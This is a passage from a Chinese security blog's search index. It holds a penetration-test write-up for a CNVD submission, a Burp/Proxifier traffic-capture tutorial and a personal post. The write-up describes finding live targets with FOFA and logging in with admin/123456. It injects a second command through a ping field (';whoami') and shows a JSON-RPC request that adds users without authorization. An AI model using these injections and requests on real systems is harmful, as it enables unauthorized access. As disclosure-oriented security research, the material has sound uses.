+        <content type="html"><![CDATA[<p>前言：挖src挖郁闷了，闲来无事选择挖一个cnvd来练练手，本次的漏洞都没啥难度，企查查资产过了5000万</p><p>说一下cnvd证书的下放标准</p><p>对于中危及中危以上通用型漏洞（CVSS2.0基准评分超过4.0分），以及涉及党政机关、重要行业单位、科研院所、重要企事业单位（如：中央国有大型企业、部委直属事业单位等）的高危事件型漏洞(后续对事件型漏洞证明颁发标准将参考中央网信办颁布的关键基础设施相关定义和分类)，CNVD将给予原创漏洞证明（即CNVD漏洞证书，电子版），该证明可通过编号在CNVD官方网站进行查询跟踪。时限要求：按周对上一周归档漏洞且满足证书颁发条件的进行批量制作。</p><p>事件型：高危 重要机构<br>通用型：中危及以上（评分4.0） 注册资金5000w以上，黑盒的测试案例10或以上（3复现+7其他案例，其他案例不要求复现），白盒的得有源码以及提供漏洞处代码调试过程，包含截图和原因。</p><p>过程：</p><p>fofa寻找目标</p><p>app&#x3D;”xx目标系统”</p><p><img src="/2024/06/05/2024-06-05-%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717552039297.png" alt="1717552039297"></p><p>admin ,123456 成功登录管理员用户（弱口令yyds）</p><p>RCE</p><p><img src="/2024/06/05/2024-06-05-%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717552211132.png" alt="1717552211132"></p><p>发现这里有一个ping 的功能，我想这里应该会存在rce漏洞</p><p>ping 127.0.0.1 -c 4 ;whoami （成功rce）</p><p><img src="/2024/06/05/2024-06-05-%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717552367582.png" alt="1717552367582"></p><p><img src="/2024/06/05/2024-06-05-%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717552712988.png" alt="1717552712988"></p><p><img src="/2024/06/05/2024-06-05-%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717553182331.png" alt="1717553182331"></p><p>越权</p><p>&#96;POST xxxxxxxxx        HTTP&#x2F;1.1<br>Host: xxxxx<br>Content-Length: 180<br>Accept: application&#x2F;json, text&#x2F;plain, <em>&#x2F;</em><br>User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;125.0.0.0 Safari&#x2F;537.36<br>Content-Type: application&#x2F;json;charset&#x3D;UTF-8<br>Origin: xxxxxxxxxxxxxxxxxxxx<br>Referer: xxxxxxxxxxxxxxxx<br>Accept-Encoding: gzip, deflate, br<br>Accept-Language: zh-CN,zh;q&#x3D;0.9<br>Connection: close</p><p>{“jsonrpc”:”2.0”,”method”:”call”,”params”:[“635F7A20A38A4072899C14B3535CFBF5”,”admin”,”sessionAddUser”,{“username”:”123456”,”password”:”554e36b4db2bc61b606ca16e756b1f7d”}],”id”:11}&#96;</p><p>这里将admin，换成任意用户即可添加成功</p><p><img src="/2024/06/05/2024-06-05-%E8%AE%B0%E4%B8%80%E6%AC%A1cnvd%E6%B8%97%E9%80%8F/1717553127082.png" alt="1717553127082"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透实例 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CNVD </tag>
+            
+            <tag> 越权 </tag>
+            
+            <tag> RCE </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>小程序抓包详细教程</title>
+      <link href="/2024/06/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/"/>
+      <url>/2024/06/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/</url>
+      
+        <content type="html"><![CDATA[<p>前言：关于小程序抓包一直想写出一个比较详细的教程</p><p>实验设备：</p><p>​微信: <a href="https://windows.weixin.qq.com/?lang=zh_CN">https://windows.weixin.qq.com/?lang=zh_CN</a></p><p>​Proxifier：<a href="https://www.proxifier.com/download/">https://www.proxifier.com/download/</a>   (需要挂梯子访问下载)</p><p>​burpsuite：<a href="https://portswigger.net/burp/communitydownload">https://portswigger.net/burp/communitydownload</a> (这里链接的是社区版的，破解版可以去吾爱下载)</p><p>上续操作都完成</p><p>1.打开proxifier portable -&gt;profile -&gt; proxy servers-&gt;add  -&gt;添加本地的端口和ip，选择https</p><p>2.打开proxifier portable -&gt;profile -&gt;proxification rules   -&gt;这里需要配置一些规则</p><p><img src="/2024/06/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%851.png" alt="小程序抓包1">)</p><p>3.设置-&gt;网络和internet-&gt;手动设置代理-&gt;编辑-&gt;将burp的代理端口配置上去（这里默认你的burp已经装好，证书已经导到浏览器）</p><p>4.burp设置 (正常配置即可)</p><p>实例演示：</p><p>微信打开小米汽车的小程序</p><p>在登录的同时抓包，正常抓包</p><hr><p><img src="/2024/06/03/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%85%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%8A%93%E5%8C%852.png" alt="小程序抓包2"></p><p>原理：proxifier portable代理了本机全部流量，用规则只保留微信和小程序的流量，按正常配置可以抓到本机任意流量，将流量导入burp,由burp来控制流量</p><p>自己试试看，你也能做到~~~</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 关于抓包两三事 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 小程序抓包 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>第一个博客发表啦</title>
+      <link href="/2024/06/02/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/"/>
+      <url>/2024/06/02/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/</url>
+      
+        <content type="html"><![CDATA[<p>今天是2024年6月2日，终于整好了这个博客，太开心了。会在上面记录自己一年的点点滴滴，一年的时间我会成为什么样子呢？应该会成为一个挖掘src的小case吧，也或许成功升本成功，再就是一个什么也不会的安服。</p><p>加油~</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 闲言碎语 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 生活 </tag>
+            
+            <tag> 成长 </tag>
+            
+            <tag> 反省 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
+</search>
